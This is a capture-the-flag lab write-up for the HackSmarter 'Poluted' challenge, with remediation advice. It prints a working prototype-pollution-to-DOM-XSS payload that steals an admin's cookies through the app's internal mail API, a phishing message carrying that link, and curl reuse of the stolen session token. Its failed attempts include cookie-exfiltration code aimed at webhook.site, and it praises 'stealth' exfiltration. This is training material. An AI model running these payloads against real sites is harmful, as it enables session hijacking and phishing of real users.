# Poluted (Prototype Pollution - XSS) (Hacksmarter)

# HackSmarter - Poluted Lab Writeup

> Date: 2026-01-08 | Difficulty: Easy | Platform: HackSmarter
> 

---

## 📊 Executive Summary

**Overall Risk Rating**: 🟠 High

**Key Findings**:

- 1 High-risk client-side prototype pollution vulnerability
- 1 DOM-based XSS vulnerability via polluted properties
- Chained exploitation leading to authentication bypass and data exfiltration

**Business Impact**: Client-side prototype pollution allows attackers to inject arbitrary JavaScript code, leading to session hijacking, data exfiltration, and unauthorized access to restricted administrative resources.

---

## 🎯 Objective

Access the `/incident-response` page which returns 403 Forbidden to normal users.

## 🔑 Initial Access

```bash
# Target Application
URL: http://10.1.22.209:3000 (SOC Portal staging application)

# Credentials
Username: pentester
Password: HackSmarter123

```

## 🔍 Key Findings

### High-Risk Vulnerabilities

1. **Client-Side Prototype Pollution** - `/dashboard` URL hash parsing (CWE-1321)
2. **DOM-Based XSS** - `executeSearch()` function via polluted callback (CWE-79)
3. **Network Egress Restrictions** - External callbacks blocked, requires internal exfiltration

**CVSS Severity Scale**:

- 🔴 Critical: 9.0-10.0 | 🟠 High: 7.0-8.9 | 🟡 Medium: 4.0-6.9 | 🔵 Low: 0.1-3.9

**CVSS v3.1 Score for Prototype Pollution + XSS Chain**: **8.1 (High)**

- **Attack Vector**: Network (AV:N)
- **Attack Complexity**: Low (AC:L)
- **Privileges Required**: Low (PR:L) - requires user interaction (admin clicks malicious link)
- **User Interaction**: Required (UI:R)
- **Scope**: Changed (S:C) - executes in admin's context
- **Confidentiality**: High (C:H) - accesses restricted admin pages
- **Integrity**: Low (I:L) - can modify DOM/send internal mail
- **Availability**: None (A:N)

## 📊 Enumeration Summary

### Application Analysis

**Target Endpoints Discovered**:

- `/dashboard` - User dashboard with search functionality
- `/incident-response` - Admin-only page (403 Forbidden for normal users)
- `/api/mail/send` - Internal mail API for sending messages
- `/api/mail` - Internal mail API for retrieving messages

**Summary**:

- **Authentication**: Session-based with cookie tokens
- **Authorization**: `/incident-response` requires admin session token
- **Network**: External egress blocked by firewall (no webhooks/external catchers work)
- **Client-side code**: Vulnerable `syncState()` and `executeSearch()` functions in dashboard.js

## 💥 Attack Chain Visualization

```
┌─────────────────────┐     ┌──────────────────┐     ┌─────────────────────┐
│   Initial Access    │────▶│   Source Code    │────▶│   Prototype         │
│  pentester:         │     │   Analysis       │     │   Pollution via     │
│  HackSmarter123     │     │   (dashboard.js) │     │   URL Hash          │
└─────────────────────┘     └──────────────────┘     └─────────────────────┘
                                                                │
                                                                ▼
┌─────────────────────┐     ┌──────────────────┐     ┌─────────────────────┐
│  Cookie Exfil via   │◀────│   DOM XSS        │◀────│   Social Eng:       │
│  Internal Mail to   │     │   Execution      │     │   Send Malicious    │
│  pentester          │     │   (admin context)│     │   URL to Admin      │
└─────────────────────┘     └──────────────────┘     └─────────────────────┘
                │
                ▼
      ┌─────────────────────┐
      │   Manual curl with  │
      │   stolen session    │
      │   token → FLAG      │
      └─────────────────────┘

```

**Attack Path Summary**:

1. **Initial Access**: Login as pentester with provided credentials
2. **Source Analysis**: Discover vulnerable `syncState()` function parsing URL hash with dot notation
3. **Prototype Pollution**: Craft URL with `__proto__.renderCallback` to pollute Object.prototype
4. **Social Engineering**: Send malicious URL to admin via internal mail system
5. **DOM XSS Execution**: Admin clicks link → XSS fires in admin's session context
6. **Cookie Exfiltration**: XSS steals `document.cookie` and mails to pentester via internal API
7. **Manual Access**: Attacker uses stolen session token to curl `/incident-response` and retrieve flag

---

## 💥 Exploitation Path

### Step 1: Source Code Analysis - Identify Vulnerable Functions

**Discovered vulnerable `syncState()` function:**

```jsx
function syncState(params, target) {
    params.split('&').forEach(pair => {
        const index = pair.indexOf('=');
        if (index === -1) return;
        const key = pair.substring(0, index);
        const value = pair.substring(index + 1);
        const path = key.split('.');  // ⚠️ Allows dot notation!
        let current = target;
        for (let i = 0; i < path.length; i++) {
            const part = decodeURIComponent(path[i]);
            if (i === path.length - 1) {
                current[part] = decodeURIComponent(value);
            } else {
                current[part] = current[part] || {};
                current = current[part];
            }
        }
    });
}

```

**Analysis**: This function parses URL hash parameters and allows dot notation like `__proto__.propertyName`, which enables prototype pollution.

**Discovered vulnerable `executeSearch()` function:**

```jsx
function executeSearch() {
    const results = document.getElementById('results');
    let options = { prefix: "Searching: " };  // renderCallback NOT defined here!

    // Sync URL hash params to options object
    if (window.location.hash) syncState(window.location.hash.substring(1), options);

    // ⚠️ CRITICAL: Checks options.renderCallback but it's not defined!
    // This means it inherits from Object.prototype if polluted!
    if (options.renderCallback) {
        const frag = document.createRange().createContextualFragment(options.renderCallback);
        results.innerHTML = "";
        results.appendChild(frag);  // DOM XSS via createContextualFragment
    }
}

```

**Analysis**: `options.renderCallback` is checked but never defined on the `options` object, so it inherits from `Object.prototype`. If we pollute `Object.prototype.renderCallback`, the check passes and arbitrary HTML/JS is rendered.

### Step 2: Craft Prototype Pollution Payload

**Goal**: Pollute `Object.prototype.renderCallback` with XSS payload that:

1. Steals admin's cookies (including session token)
2. Exfiltrates cookies via internal mail API (external network blocked)

**Payload (decoded for readability):**

```html
<script>fetch('/api/mail/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({to:'pentester@hacksmarter.local',subject:'cookies',body:document.cookie})})</script>

```

**Payload (URL-encoded for hash):**

```
http://10.1.22.209:3000/dashboard#__proto__.renderCallback=%3Cscript%3Efetch('/api/mail/send',%7Bmethod:'POST',headers:%7B'Content-Type':'application/json'%7D,body:JSON.stringify(%7Bto:'pentester@hacksmarter.local',subject:'cookies',body:document.cookie%7D)%7D)%3C/script%3E

```

**🔒 Stealth Advantage:** This approach uses the application's own internal mail system for exfiltration - no external network calls that would trigger firewall alerts or show up in network logs as suspicious outbound traffic.

**Payload breakdown**:

```jsx
// 1. Steal admin's cookies
document.cookie  // Contains: user=admin; session=HS_ADMIN_7721_SECURE_AUTH_TOKEN

// 2. Exfiltrate via internal mail API (external network blocked!)
fetch('/api/mail/send', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    to: 'pentester@hacksmarter.local',
    subject: 'cookies',
    body: document.cookie  // Admin's cookies with session token
  })
})

```

### Step 3: Social Engineering - Send Malicious Link to Admin

Using the application's internal mail system, compose a message to the admin containing the malicious URL:

```
To: admin@hacksmarter.local
Subject: Urgent: Dashboard Issue
Body: Hi Admin, I'm seeing strange behavior on the dashboard. Can you check this link?
http://10.1.22.209:3000/dashboard#__proto__.renderCallback=%3Cscript%3Efetch('/api/mail/send',%7Bmethod:'POST',headers:%7B'Content-Type':'application/json'%7D,body:JSON.stringify(%7Bto:'pentester@hacksmarter.local',subject:'cookies',body:document.cookie%7D)%7D)%3C/script%3E

```

### Step 4: Admin Clicks Link - XSS Executes

**What happens when admin clicks the link:**

1. **URL hash parsed**: `window.location.hash` contains `__proto__.renderCallback=<script>...</script>`
2. **Prototype pollution**: `syncState()` sets `Object.prototype.renderCallback = '<script>...</script>'`
3. **Options object created**: `let options = { prefix: "Searching: " }` (no renderCallback property)
4. **Inheritance check passes**: `if (options.renderCallback)` → true (inherits from Object.prototype!)
5. **DOM XSS fires**: `createContextualFragment(options.renderCallback)` renders malicious script
6. **Script executes**: Fetches `/api/mail/send` with admin's cookies as body
7. **Cookies exfiltrated**: Mail sent to `pentester@hacksmarter.local` with admin's session token

### Step 5: Retrieve Cookies and Access /incident-response

1. **Check pentester's inbox** using the `GET /api/mail` endpoint:
    
    ```bash
    curl http://10.1.22.209:3000/api/mail -H "Cookie: user=pentester"
    
    ```
    
    **Response:**
    
    ```json
    [{
        "from": "system",
        "subject": "Welcome",
        "body": "Good luck on the audit."
    },
    {
        "from": "admin",
        "subject": "cookies",
        "body": "session=HS_ADMIN_7721_SECURE_AUTH_TOKEN; user=admin",
        "read": false
    }]
    
    ```
    
2. **Manually access the restricted page** using stolen session token:
    
    ```bash
    curl http://10.1.22.209:3000/incident-response \\
      -H "Cookie: user=admin; session=HS_ADMIN_7721_SECURE_AUTH_TOKEN"
    
    ```
    
3. **Flag retrieved** from the response!

**🔒 Stealth Note:** The entire exfiltration happens through the application's own infrastructure - admin sends mail via `/api/mail/send`, attacker retrieves via `GET /api/mail`. No external callbacks, webhooks, or suspicious outbound connections.

## 🏁 Flag / Objective Achieved

✅ **Objective**: Accessed `/incident-response` page via prototype pollution + DOM XSS + cookie theft

✅ **Flag**: Retrieved by manually curling `/incident-response` with stolen admin session token

## 📝 Key Learnings

- **Client-side prototype pollution**: Server-side sanitization (body-parser) doesn't protect against URL hash-based pollution
- **Inherited properties**: Properties that are CHECKED but not DEFINED inherit from `Object.prototype` - perfect pollution targets
- **Internal exfiltration for stealth**: Using the application's own mail system (`/api/mail/send` → `GET /api/mail`) avoids external network calls that trigger firewall alerts or appear in network logs as suspicious outbound traffic
- **Living off the land**: When external callbacks are blocked, abuse internal application features
- **Session context matters**: The XSS executes in the admin's browser with their session token, not the attacker's
- **Social engineering + technical exploit**: Combining a phishing approach (sending malicious link) with a technical vulnerability (prototype pollution)

## 🛠️ Tools Used

- **Browser DevTools** - Source code analysis and debugging
- **Burp Suite** - HTTP request interception and analysis
- **URL Encoder** - Payload encoding for URL hash parameters

## 💡 Remediation (Top 2)

### 1. Client-Side Prototype Pollution in syncState() (CVSS: 8.1 - High)

**Issue**: The `syncState()` function parses URL hash parameters with dot notation, allowing attackers to pollute `Object.prototype` via `__proto__.propertyName` syntax.

**CWE Reference**: CWE-1321 - Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')

**Fix**:

1. Sanitize property names to prevent `__proto__`, `constructor`, and `prototype` access
2. Use `Object.create(null)` for objects that will hold user-controlled keys
3. Freeze Object.prototype to prevent modification

**Code Example**:

```jsx
// BEFORE (Vulnerable)
function syncState(params, target) {
    params.split('&').forEach(pair => {
        const index = pair.indexOf('=');
        if (index === -1) return;
        const key = pair.substring(0, index);
        const value = pair.substring(index + 1);
        const path = key.split('.');  // ⚠️ Allows __proto__ pollution!
        let current = target;
        for (let i = 0; i < path.length; i++) {
            const part = decodeURIComponent(path[i]);
            if (i === path.length - 1) {
                current[part] = decodeURIComponent(value);
            } else {
                current[part] = current[part] || {};
                current = current[part];
            }
        }
    });
}

// AFTER (Secure)
function syncState(params, target) {
    // Blacklist dangerous property names
    const FORBIDDEN_KEYS = ['__proto__', 'constructor', 'prototype'];

    params.split('&').forEach(pair => {
        const index = pair.indexOf('=');
        if (index === -1) return;
        const key = pair.substring(0, index);
        const value = pair.substring(index + 1);
        const path = key.split('.');

        // ✅ Validate each path segment
        if (path.some(part => FORBIDDEN_KEYS.includes(part.toLowerCase()))) {
            console.warn('Blocked prototype pollution attempt:', key);
            return;  // Skip this parameter
        }

        let current = target;
        for (let i = 0; i < path.length; i++) {
            const part = decodeURIComponent(path[i]);
            if (i === path.length - 1) {
                // ✅ Use hasOwnProperty check before assignment
                if (Object.prototype.hasOwnProperty.call(current, part) ||
                    !FORBIDDEN_KEYS.includes(part.toLowerCase())) {
                    current[part] = decodeURIComponent(value);
                }
            } else {
                current[part] = current[part] || {};
                current = current[part];
            }
        }
    });
}

// EVEN BETTER: Use Object.create(null) for user-controlled objects
function executeSearch() {
    const results = document.getElementById('results');
    let options = Object.create(null);  // ✅ No prototype chain!
    options.prefix = "Searching: ";

    if (window.location.hash) syncState(window.location.hash.substring(1), options);

    // This check will now work correctly (no inheritance from Object.prototype)
    if (options.renderCallback) {
        // ...
    }
}

```

---

### 2. DOM-Based XSS via createContextualFragment() (CVSS: 7.4 - High)

**Issue**: The `executeSearch()` function uses `createContextualFragment()` with unsanitized user input from polluted properties, allowing arbitrary HTML/JavaScript injection.

**CWE Reference**: CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

**Fix**:

1. Never use `createContextualFragment()` or `innerHTML` with user-controlled data
2. Use safe DOM APIs like `textContent` or sanitize with DOMPurify
3. Implement Content Security Policy (CSP) to prevent inline script execution

**Code Example**:

```jsx
// BEFORE (Vulnerable)
function executeSearch() {
    const results = document.getElementById('results');
    let options = { prefix: "Searching: " };
    if (window.location.hash) syncState(window.location.hash.substring(1), options);

    if (options.renderCallback) {
        // ⚠️ DANGEROUS: Renders arbitrary HTML/JS from user input
        const frag = document.createRange().createContextualFragment(options.renderCallback);
        results.innerHTML = "";
        results.appendChild(frag);
    }
}

// AFTER (Secure)
function executeSearch() {
    const results = document.getElementById('results');
    let options = Object.create(null);
    options.prefix = "Searching: ";

    if (window.location.hash) syncState(window.location.hash.substring(1), options);

    // ✅ Use textContent instead of HTML rendering
    if (options.renderCallback) {
        results.textContent = options.prefix + options.renderCallback;
    }
}

// ALTERNATIVE: Use DOMPurify for safe HTML sanitization
import DOMPurify from 'dompurify';

function executeSearch() {
    const results = document.getElementById('results');
    let options = Object.create(null);
    options.prefix = "Searching: ";

    if (window.location.hash) syncState(window.location.hash.substring(1), options);

    if (options.renderCallback) {
        // ✅ Sanitize HTML before rendering
        const clean = DOMPurify.sanitize(options.renderCallback);
        results.innerHTML = clean;
    }
}

```

**Add Content Security Policy header**:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';

```

---

## Failed Attempts - What Didn't Work

### Approach 1: Server-Side Prototype Pollution

**Attempted**: Sending `__proto__` in POST request body to server-side endpoints

```bash
POST /api/endpoint
Content-Type: application/json

{"__proto__": {"isAdmin": true}}

```

**Result**: ❌ Failed - Server-side `body-parser` sanitizes `__proto__` in request bodies

### Approach 2: Property-Based Authorization Bypass

**Attempted**: Polluting properties that might control authorization

```bash
__proto__.isAdmin=true
__proto__.admin=true
__proto__.role=admin
__proto__.authenticated=true

```

**Result**: ❌ Failed - Authorization is enforced server-side via session cookies, not client-side properties

**Learning**: Client-side prototype pollution cannot directly bypass server-side authorization checks

### Approach 3: External Exfiltration via Webhook.site

**Attempted**: Using external Exfil services (RequestBin, Burp Collaborator, webhook.site)

```jsx
fetch('/incident-response')
  .then(r => r.text())
  .then(d => fetch('https://webhook.site/[id]>', {
    method: 'POST',
    body: d
  }))

```

```jsx
fetch('https://webhook.site/[id]>', {
    method: 'POST',
    body: document.cookies
  }))
```

**Result**: ❌ Failed - Firewall blocks external network egress from application

**Note**: Also had trouble even when self hosting exfil endpoint. No response from admin, or very delayed.

**Learning**: When external callbacks don't work, look for internal application features that can be abused (mail APIs, logging, internal webhooks, etc.)

### Approach 4: Direct Access Attempt

**Attempted**: Accessing `/incident-response` directly as pentester user

```bash
GET /incident-response HTTP/1.1
Host: 10.1.22.209:3000
Cookie: session=pentester_session_token

```

**Result**: ❌ 403 Forbidden - Proper authorization check enforced

**Learning**: The actual authentication was session-based (not client-side properties), requiring XSS in admin's context to succeed

## 🔒 OWASP Top 10 Coverage

- [x]  **A03:2021** - Injection (DOM-based XSS via prototype pollution)
- [x]  **A04:2021** - Insecure Design (client-side parsing of user-controlled URL hash)
- [x]  **A05:2021** - Security Misconfiguration (missing CSP, prototype pollution protection)
- [x]  **A08:2021** - Software & Data Integrity (Object.prototype pollution)

## Lab Metadata

**Tags**: #prototype-pollution #dom-xss #client-side #social-engineering #exfiltration #hacksmarter

**Personal Notes:**

- Great example of chaining client-side vulnerabilities (prototype pollution → DOM XSS)
- Network restrictions forced creative thinking (internal mail API for exfiltration)
- Demonstrates importance of understanding inheritance and prototype chains in JavaScript
- Social engineering component (sending malicious link to admin) is realistic attack vector

---

## 🔗 References

**Prototype Pollution Resources**:

- [PortSwigger - Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
- [OWASP - Prototype Pollution](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html)
- [Snyk - Prototype Pollution Attack](https://learn.snyk.io/lessons/prototype-pollution/javascript/)

**DOM XSS Resources**:

- [OWASP - DOM-based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)
- [PortSwigger - DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)

**CVSS Calculator**: [https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator)

**CWE Database**: [https://cwe.mitre.org/](https://cwe.mitre.org/)

- CWE-1321: Prototype Pollution
- CWE-79: Cross-site Scripting (XSS)
- CWE-285: Improper Authorization

**OWASP Top 10**: [https://owasp.org/Top10/](https://owasp.org/Top10/)

---

**Document Version**: 1.0

**Last Updated**: 2026-01-08

**Template**: Quick Assessment Template v2.0 
